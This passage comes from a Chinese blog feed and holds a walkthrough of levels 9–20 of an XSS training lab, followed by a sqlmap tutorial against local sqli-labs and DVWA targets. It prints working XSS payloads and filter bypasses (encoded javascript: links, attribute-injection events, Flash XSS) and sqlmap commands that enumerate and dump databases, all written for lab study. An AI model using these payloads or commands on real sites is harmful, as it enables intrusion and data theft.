src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319215105481.png" alt="image-20240319215105481"></p><p>因此需要我们构造的payload后面增加</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/*http:/</span><span class="hljs-regexp">/*/</span><br></code></pre></td></tr></table></figure><p>即可</p><p>Unicode编码解码工具：<a href="https://www.matools.com/code-convert-unicode">https://www.matools.com/code-convert-unicode</a></p><p>但是我们注意要在http://加上注释否则会导致我们输入的javascript代码无法正常发挥作用</p><p>所以payload：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">39</span>;&amp;#<span class="hljs-number">120</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">39</span>;&amp;#<span class="hljs-number">41</span>;<span class="hljs-comment">/*http://*/</span><br></code></pre></td></tr></table></figure><h3 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a>注意：</h3><p>1.必须要把注释掉的http放到最后，建议以后养成把注释放到语句最后面的习惯</p><p>（因为不同的解析器可能会先去解码但是我们的注释在unicode编码的前面这样可能会导致我们的注释起不了作用——仅代表个人理解）</p><ol start="2"><li></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">为什么把javascript:alert(<span class="hljs-string">&#x27;xss&#x27;</span>)<span class="hljs-regexp">/*http:/</span><span class="hljs-regexp">/*/</span>直接unicode编码不行<br></code></pre></td></tr></table></figure><p>因为href属性中unicode解码是发生在用户点击链接向浏览器发起请求的时候</p><p>并不是说我们传的参数到后端已经解码了</p><p>它会直接把unicode编码后的内容传给后端这样后端就无法识别到http://从而导致xss失败</p><h2 id="HTML事件发挥作用的前提"><a href="#HTML事件发挥作用的前提" class="headerlink" title="HTML事件发挥作用的前提"></a>HTML事件发挥作用的前提</h2><p><strong>需要写在html文件的<script>的标签中或者作为html标签属性的值即在<>里边</strong></p><p>这个比较重要做题前需要先搞清楚这个</p><h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><p>进入这关发现并不存在输入框发现是通过改url get传参然后看看" >是否被实体化</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320154611729.png" alt="image-20240320154611729"></p><p>由图可知 " > 均被实体化这就导致我们在h2标签中无法使用<script>标签来完成xss而且根据我们传入的参数的位置也无法利用html来实现xss</p><p>但是根据上图发现它还藏起来了三个input标签可以去试试看能不能传入参数</p><p>尝试发现前两个标签不行但是最后那个t_sort可以然后经过输入发现它过滤了<>这就使我们不能去使用script标签那我就利用HTML事件但是还需要一个输入框否则无法触发 这还需要闭合一下</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=<span class="hljs-string">&quot;onmouseover=alert(&#x27;xss&#x27;) type=&quot;</span>text<br></code></pre></td></tr></table></figure><p>type的作用是让输入框显示出来</p><p>原理：</p><p>当input标签中有两个type属性时那么html解析器会只解析第一个属性这样便可以让type="hidden"失效从而显现出来输入框</p><p>使用其他html事件也可以</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320192528221.png" alt="image-20240320192528221"></p><h2 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h2><p>在这关发现在h2标签中同样进行了html实体化</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320200424216.png" alt="image-20240320200424216"></p><p>看到页面源代码后发现有藏起来的input标签然后一个个试看看哪个能够输入试了一圈发现只有t_sort可以但是当我去输入 " > 发现都被过滤如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320200828495.png" alt="image-20240320200828495"></p><p>因此说明get传参这条路走不通（没办法了缺乏经验我去看看后端代码）</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320201151444.png" alt="image-20240320201151444"></p><p>发现其实t_ref其实也可以获得参数但是是从referer头里获取 可以去试试burp改包</p><p>发现这道题把<>过滤了我们可以试试html事件</p><p>payload：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-string">&quot;onmouseover=alert(&#x27;xss&#x27;) type=&quot;</span><span class="hljs-built_in">text</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-20%20202231.png" alt="屏幕截图 2024-03-20 202231"></p><p>然后发包</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320202257465.png" alt="image-20240320202257465"></p><h2 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h2><h3 id="新知识：User-Agent-头"><a href="#新知识：User-Agent-头" class="headerlink" title="新知识：User-Agent 头"></a>新知识：User-Agent 头</h3><p>User-Agent 头通常包含了以下信息：</p><ul><li>浏览器名称和版本号</li></ul><ul><li>操作系统名称和版本号</li><li>用户代理类型（例如，是一个桌面浏览器、移动浏览器还是爬虫）</li><li>其他可选的信息，如硬件类型、渲染引擎等</li></ul><p>进入到这关后先看看页面源代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320203159179.png" alt="image-20240320203159179"></p><p>很明显最后一个input标签的value属性是User-Agent 头</p><p>直接抓包一样发现过滤了 <> 那就和上一关一样用html事件</p><p>payload：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-string">&quot;onmouseover=alert(&#x27;xss&#x27;) type=&quot;</span><span class="hljs-built_in">text</span><br></code></pre></td></tr></table></figure><p>把包中的user-agent头改成payload即可</p><p>发包后如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-20%20203716.png" alt="屏幕截图 2024-03-20 203716"></p><h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><p>老样子先看看页面源代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320210041241.png" alt="image-20240320210041241"></p><p>一眼看到这个提示根据cook猜测是Cookie那就打开控制台瞅瞅如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320210259262.png" alt="image-20240320210259262"></p><p>嘿嘿果然是那就改它payload：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-string">&quot;onfocus=alert(&#x27;xss&#x27;) type=&quot;</span><span class="hljs-built_in">text</span><br></code></pre></td></tr></table></figure><p>这里的onfocus我只是换了html事件而已目的和onmouseover是一样的</p><p>改完后刷新一下即可如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320210551614.png" alt="image-20240320210551614"></p><h2 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h2><p>跳转的网站没了就没做</p><h2 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h2><p>老样子瞅瞅页面源代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-20%20214117.png" alt="屏幕截图 2024-03-20 214117"></p><h3 id="新知识：ng-include指令"><a href="#新知识：ng-include指令" class="headerlink" title="新知识：ng-include指令"></a>新知识：ng-include指令</h3><p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320215303527.png" alt="image-20240320215303527"></p><p>然后我们可以直接利用第一关的漏洞进行xss</p><p>但是当我使用<script>标签时不行结果看了一眼页面源代码发现它过滤了<></p><p>因此可以选择不需要用到<>的一关即可 呃还过滤了""</p><p> 对比发现，这里有个html实体化函数在，没有删掉东西，所以不影响我们接下来的操作，我们可以包涵第一关并让第一关弹窗（注意，这里不能包涵那些直接弹窗的东西如<script>，但是可以包涵那些标签的东西比如<a>、<input>、<img>、<p>标签等等，这些标签是能需要我们手动点击弹窗的），这里我们使用img标签，可参考XSS常见的触发标签，构造payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?src=&#x27;./level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><p>注意传参数其实是分开的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;./level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><p>这部分是传到第15关中了而</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">name</span>=&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onmouseover</span>=alert()&gt;<br></code></pre></td></tr></table></figure><p>这部分是传到第一关的后端了</p><p>我建议这一关不要直接使用<script>标签来直接弹窗可能会不成功</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-20%20220920.png" alt="屏幕截图 2024-03-20 220920"></p><h2 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h2><p>先看页面源代码如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321085130061.png" alt="image-20240321085130061"></p><p>发现输入的内容在<center>中先看看过滤了什么</p><p>输入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?keyword=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span> <span class="hljs-symbol">&amp;#106;</span> </span></span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321085501294.png" alt="image-20240321085501294"></p><p>由图可知 空格 单双引号均被实体化还会把所有的大写字母转化为小写</p><p>没啥思路可以去看看后端代码如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321090013724.png" alt="image-20240321090013724"></p><p>发现还过滤了/可以去看看这里边符合要求的标签（不能有script / 空格 单双引号） [xxs常见的触发标签](<a href="https://blog.csdn.net/LYJ20010728/article/details/116462782">XSS常见的触发标签_xss< img src onerror=alt=''+document.domain>”怎么触发-CSDN博客</a>)</p><p>空格可以使用回车的url编码来替代</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg%<span class="hljs-attribute">0aonload</span>=alert(1)&gt;<br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321090716362.png" alt="image-20240321090716362"></p><h2 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h2><p>先看页面源代码来确定输入的东西在哪个位置</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20091509.png" alt="屏幕截图 2024-03-21 091509"></p><p>然后看看它过滤了什么输入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?arg01=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>; &amp;arg02=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>;</span></span></span></span><br></code></pre></td></tr></table></figure><p>发现<> 和""不行</p><p>不知道embed标签的可以去查查</p><p>发现str属性后的xsf01.swf是一个flash动画文件所以要到一个支持flash的浏览器上这个动画文件才能正常显现出来如果不想下载这个插件的话我们可以去后端把xsf01.swf改成index.png（和这关的php文件在同一文件夹下的png图片均可）</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20093252.png" alt="屏幕截图 2024-03-21 093252"></p><p>因为<> 和""不行所以选择使用html事件payload 1：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg01= onclick&amp;<span class="hljs-attribute">arg02</span>=alert()<br></code></pre></td></tr></table></figure><p>这样构造的原因是因为我发现在刚开始传入两个参数的时候中间会加上一个等号然后传入这两个参数到后端就会构造出完整的onclick事件onclick=alert()如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20123302.png" alt="屏幕截图 2024-03-21 123302"></p><p>或者payload 2：?arg02= onlick=alert()</p><p>注意：要在onclick的前面加上一个空格这样才不会和src的属性连在一起</p><p>payload 1和2的结果分别如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20122824.png" alt="屏幕截图 2024-03-21 122824"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20123520.png" alt="屏幕截图 2024-03-21 123520"></p><p><strong>此题还有一个点在开始的时候困了我好久：对于<embed>标签可能有些浏览器不支持当paylaod没问题的时候可以换个浏览器试试</strong></p><h2 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h2><p>先来瞅瞅页面源代码发现还是有一个flash文件先和上一关一样改一下然后试试看他过滤了什么</p><p>一样先测试一波看看它过滤了什么</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?arg02=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>;</span></span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20133626.png" alt="屏幕截图 2024-03-21 133626"></p><p>发现和上一关一样过滤了 "" <> 直接构造payload：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?a</span>rg01= onclick&amp;arg02=alert(<span class="hljs-string">&#x27;xss&#x27;</span>)<br></code></pre></td></tr></table></figure><p>如图:</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20133528.png" alt="屏幕截图 2024-03-21 133528"></p><h2 id="Level-19"><a href="#Level-19" class="headerlink" title="Level 19"></a>Level 19</h2><p>一样瞅瞅页面源代码如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20133838.png" alt="屏幕截图 2024-03-21 133838"></p><p>发现还是一样的这关我选择去用一下flash可以去给Google装个flash插件即可图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20135354.png" alt="屏幕截图 2024-03-21 135354"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321142806174.png" alt="image-20240321142806174"></p><p>一样先试试他过滤了啥</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?arg02=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>;</span></span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321142951526.png" alt="image-20240321142951526"></p><p>发现和上一关一样</p><p>试试：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?a</span>rg01= onclick&amp;arg02=alert(<span class="hljs-string">&#x27;xss&#x27;</span>)<br></code></pre></td></tr></table></figure><p>发现这关使用了双引号但是我们无法进行闭合</p><p>这关用到的是Flash Xss注入，可参考</p><p><a href="https://blog.csdn.net/u014029795/article/details/103213877">Level 19 Flash XSS</a>与<a href="https://blog.csdn.net/weixin_30702413/article/details/99326627">Flash XSS 漏洞详解</a></p><p>其实就是往Flash里面插入一段js代码，然后手动执行</p><p>构造payload ：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=version&amp;arg02=&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:alert()&quot;</span>&gt;here&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321143915164.png" alt="image-20240321143915164"></p><h2 id="Level-20"><a href="#Level-20" class="headerlink" title="Level 20"></a>Level 20</h2><p>这关也是有双引号仍然需要反编译</p><p>参考<a href="https://blog.csdn.net/u014029795/article/details/103217680">Level 20 Flash XSS</a></p><p>直接构建payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?arg01=id<span class="hljs-meta">&amp;arg02=xss\&quot;))&#125;catch(e)&#123;alert(1)&#125;<span class="hljs-comment">//%26width=123%26height=123</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap的使用</title>
    <link href="/2024/04/25/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/04/25/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h1><h2 id="Sqlmap-URL-检测"><a href="#Sqlmap-URL-检测" class="headerlink" title="Sqlmap URL 检测"></a>Sqlmap URL 检测</h2><p>sqlmap直接对单一的url探测，参数使用-u或–url</p><p>payload：<code>sqlmap -u &quot;http://192.168.10.1/sqlilabs/sqli-labs-php7-master/Less-1/?id=1&quot; --banner</code></p><p><strong>注意：</strong>如果进入这个页面要先登录那么就需要把cookie带上</p><p><code>sqlmap -u &quot;test.dvwa.com/vulnerabilities/sqli/?Submit=Submit&amp;id=1&quot; --cookie=&quot;PHPSESSID=q1addgmk7rq4u9elognarqt96r; security=low&quot; --banner</code></p><p><strong>注意：在虚拟机上运行此命令的时候要把原来的127.0.0.1变为本机对应虚拟机的ip 192.168.10.1</strong>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404232127039.png" alt="image-20240423212734889"></p><p>–banner是用来获得取目标数据库其版本信息以及其他相关信息</p><p>然后就ok了 如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242019404.png" alt="屏幕截图 2024-04-24 201850"></p><p>由上图可知此题存在四种注入方式</p><p>分别是：布尔盲注，报错注入，延时注入，联合查询</p><h2 id="sql注入常用指令："><a href="#sql注入常用指令：" class="headerlink" title="sql注入常用指令："></a>sql注入常用指令：</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” <span class="hljs-attr">--dbs</span> <span class="hljs-comment">// 列举数据库</span><br>sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” <span class="hljs-attr">--current-db</span> <span class="hljs-comment">// 当前数据库</span><br>sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” <span class="hljs-attr">--users</span> <span class="hljs-comment">// 列数据库的用户</span><br>sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” <span class="hljs-attr">--current</span>–user <span class="hljs-comment">// 当前用户</span><br>sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” -D <span class="hljs-string">&quot;指定数据库&quot;</span> <span class="hljs-attr">--tables</span><span class="hljs-comment">// 列举指定数据库的表名</span><br>sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” -D <span class="hljs-string">&quot;指定数据库&quot;</span> -T <span class="hljs-string">&quot;指定表&quot;</span> <span class="hljs-attr">--columns</span><span class="hljs-comment">// 获取表的列名</span><br>sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” -D <span class="hljs-string">&quot;指定数据库&quot;</span> -T <span class="hljs-string">&quot;指定表&quot;</span> <span class="hljs-attr">--dump</span><span class="hljs-comment">//获取数据库下表的列信息</span><br></code></pre></td></tr></table></figure><h2 id="Sqlmap文件读取目标"><a href="#Sqlmap文件读取目标" class="headerlink" title="Sqlmap文件读取目标"></a>Sqlmap文件读取目标</h2><p> sqlmap支持从不同类型的文件中读取目标进行sql注入探测</p><p>1、<code>-r 从文本文件中读取Http请求作为sql注入探测的目标</code></p><p>2、-x 从sitemap.xml站点地图文件中读取目标检测</p><p>3、-m 从多行文本格式文件读取多个目标，对多个目标进行探测</p><h3 id="1-r-从文本文件中读取Http请求作为sql注入探测的目标"><a href="#1-r-从文本文件中读取Http请求作为sql注入探测的目标" class="headerlink" title="1.-r 从文本文件中读取Http请求作为sql注入探测的目标"></a>1.-r 从文本文件中读取Http请求作为sql注入探测的目标</h3><p>（文本文件中的请求包是burp拦截的请求包来实现 ）</p><p><strong>它和直接使用sqlmap -u “网址” –banner的区别是直接-u所发送的请求包是sqlmap脚本自己构造的可能因为和这个网站原来的请求包不同但是 使用-r指令可以使用这个网站的请求包这样被拦截的几率就降低了</strong></p><p>为了方便我们要先设置一下burp使请求包保存在一个文件中</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242205644.png" alt="屏幕截图 2024-04-24 220309"></p><p>按照次序依次操作最后保存文件名设置为test不用后缀</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242207193.png" alt="image-20240424220713102"></p><p>然后正常的抓包抓到后点击forward直到包被放没了</p><p>然后将我们的包拖到我们的虚拟机中（<strong>注意：如果使本机的靶场切记一定要把127.0.0.1改成我们本机对虚拟机所使用的ip</strong>）</p><p>payload：sqlmap -l test</p><p>如图即可：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242213698.png" alt="屏幕截图 2024-04-24 221246"></p><p>如何去看ip：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242224792.png" alt="屏幕截图 2024-04-24 221423"></p><p>ip是由一层层分配下来的前两个是针对虚拟机的ip具体是哪个可以去看一下虚拟机的网络设置便可确定</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242236877.png" alt="屏幕截图 2024-04-24 223536"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242236729.png" alt="屏幕截图 2024-04-24 223556"></p><p>WLAN后是本机在这个局域网中所分配到的ip</p><h3 id="2-x-从sitemap-xml站点地图文件中读取目标检测"><a href="#2-x-从sitemap-xml站点地图文件中读取目标检测" class="headerlink" title="2.-x 从sitemap.xml站点地图文件中读取目标检测"></a>2.-x 从sitemap.xml站点地图文件中读取目标检测</h3><p>sqlmap -x sqmmap.xml </p><h4 id="如何去判断一个站点是否存在站点地图文件"><a href="#如何去判断一个站点是否存在站点地图文件" class="headerlink" title="如何去判断一个站点是否存在站点地图文件"></a>如何去判断一个站点是否存在站点地图文件</h4><ol><li><strong>直接访问robots.txt文件</strong>：robots.txt是一个文本文件，通常位于网站的根目录下，用于指示搜索引擎爬虫访问哪些页面或不访问哪些页面。在robots.txt文件中，有时会包含站点地图文件的链接。你可以尝试访问该文件，查看是否包含了站点地图文件的链接。</li><li><strong>查看网站的robots meta标签</strong>：有些网站在页面的<head>标签中使用robots meta标签来指示搜索引擎是否可以索引该页面，以及是否可以遵循页面上的链接。在robots meta标签中，有时也会包含站点地图文件的链接。</li><li><strong>尝试访问默认的站点地图URL</strong>：一些网站的站点地图文件位于固定的URL路径下，比如&#x2F;sitemap.xml或&#x2F;sitemap_index.xml。你可以尝试直接访问这些默认的站点地图URL，查看是否存在站点地图文件。</li><li><strong>使用在线工具检查</strong>：有些在线工具可以帮助你检查一个网站是否存在站点地图文件，比如XML站点地图验证器或SEO工具。你可以使用这些工具输入网站的URL，然后查看它们是否能够找到站点地图文件。</li></ol><h3 id="3-m-从多行文本格式文件读取多个目标，对多个url目标进行探测"><a href="#3-m-从多行文本格式文件读取多个目标，对多个url目标进行探测" class="headerlink" title="3.-m 从多行文本格式文件读取多个目标，对多个url目标进行探测"></a>3.-m 从多行文本格式文件读取多个目标，对多个url目标进行探测</h3><p>这个命令可以实现对多个url进行测试txt文件如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404251343874.png" alt="屏幕截图 2024-04-25 134332"></p><p>但是在使用sqlmap扫的时候有 一些操作会询问是否进行  注意进行辨别</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404251351564.png" alt="屏幕截图 2024-04-25 135052"></p>]]></content>
    
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA</title>
    <link href="/2024/04/25/%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1%20DVWA%E9%9D%B6%E5%9C%BA/"/>
    <url>/2024/04/25/%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1%20DVWA%E9%9D%B6%E5%9C%BA/</url>
    
